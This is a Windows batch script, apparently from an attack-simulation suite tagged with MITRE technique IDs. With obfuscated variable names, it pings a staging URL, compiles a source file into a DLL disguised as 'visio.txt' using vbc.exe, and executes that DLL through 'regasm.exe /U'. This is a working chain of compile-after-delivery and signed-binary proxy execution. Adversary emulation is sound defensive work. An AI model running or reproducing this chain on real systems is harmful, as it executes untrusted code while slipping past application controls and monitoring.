@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET recnn=%APPDATA%\9253\cce1847d
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?9253-10
SET lqyereup=ITZEL-S2BS
SET ufeybybm=10
SET hpnjatpj=visio.txt
SET njozco=file.txt
SET kkjwr=9253
SET vvnn=!APPDATA!\!ufeybybm!
SET jjii=!vvnn!\macula-simulations.log
SET xxyy=%SystemRoot%\Microsoft.NET\Framework\v4.0.30319
SET bbee=0

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_start=!uouoq!>> "!jjii!" 2>nul
curl -k -s -o nul "!uouoq!"
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_complete=!ERRORLEVEL!>> "!jjii!" 2>nul

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir_start=!recnn!>> "!jjii!" 2>nul
cd /d "!recnn!" 2>nul
SET bbee=!ERRORLEVEL!
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir_result=!bbee!>> "!jjii!" 2>nul
IF !bbee! NEQ 0 (
    SET res=0
    SET err=chdir_failed
    echo [!DATE! !TIME!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|Compile After Delivery=!res!:!err!>> "!jjii!" 2>nul
    exit /b !bbee!
)

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compile_start=!njozco!>> "!jjii!" 2>nul
"!xxyy!\vbc.exe" /nologo /target:library "!njozco!" /out:"!hpnjatpj!" 2>nul
SET bbee=!ERRORLEVEL!
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compile_result=!bbee!>> "!jjii!" 2>nul
SET res=1
SET err=
IF !bbee! NEQ 0 SET res=0&SET err=compile_failed
echo [!DATE! !TIME!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|Compile After Delivery=!res!:!err!>> "!jjii!" 2>nul
IF !res! EQU 0 exit /b !bbee!

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: execution_start=!hpnjatpj!>> "!jjii!" 2>nul
"!xxyy!\regasm.exe" /U "!hpnjatpj!" 2>nul
SET bbee=!ERRORLEVEL!
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: execution_result=!bbee!>> "!jjii!" 2>nul
SET res=1
SET err=
IF !bbee! NEQ 0 SET res=0&SET err=execution_failed
echo [!DATE! !TIME!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218|Signed Binary Proxy Execution=!res!:!err!>> "!jjii!" 2>nul